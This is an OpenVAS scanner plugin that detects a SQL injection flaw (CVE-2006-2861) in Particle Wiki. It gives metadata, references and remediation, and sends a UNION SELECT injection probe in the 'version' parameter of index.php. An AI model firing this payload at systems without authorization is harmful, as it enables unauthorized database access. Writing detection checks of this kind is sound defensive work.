###############################################################################
# OpenVAS Vulnerability Test
#
# Particle Wiki Index.PHP SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100837");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-10-04 14:08:22 +0200 (Mon, 04 Oct 2010)");
  script_bugtraq_id(18273);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2861");
  script_name("Particle Wiki Index.PHP SQL Injection Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/18273");
  script_xref(name:"URL", value:"http://pridels0.blogspot.com/2006/06/particle-wiki-sql-inj.html");
  script_xref(name:"URL", value:"http://www.particlesoft.net/particlewiki/");
  script_xref(name:"URL", value:"http://www.particlesoft.net/kb-16.htm");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_particle_wiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("particle_wiki/detected");

  script_tag(name:"solution", value:"The vendor released an update. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Particle Wiki is prone to an SQL-injection vulnerability. This issue
  is due to a failure in the application to properly sanitize user-
  supplied input before using it in an SQL query.");

  script_tag(name:"impact", value:"A successful exploit could allow an attacker to compromise the
  application, access or modify data, or exploit vulnerabilities in the
  underlying database implementation.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"particle_wiki"))
  exit(0);

url = string(dir, "/index.php?version=-1%20union%20select%201,1,1,1,1,0x53514c2d496e6a656374696f6e2d54657374%20--");

if(http_vuln_check(port:port, url:url, pattern:"SQL-Injection-Test")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
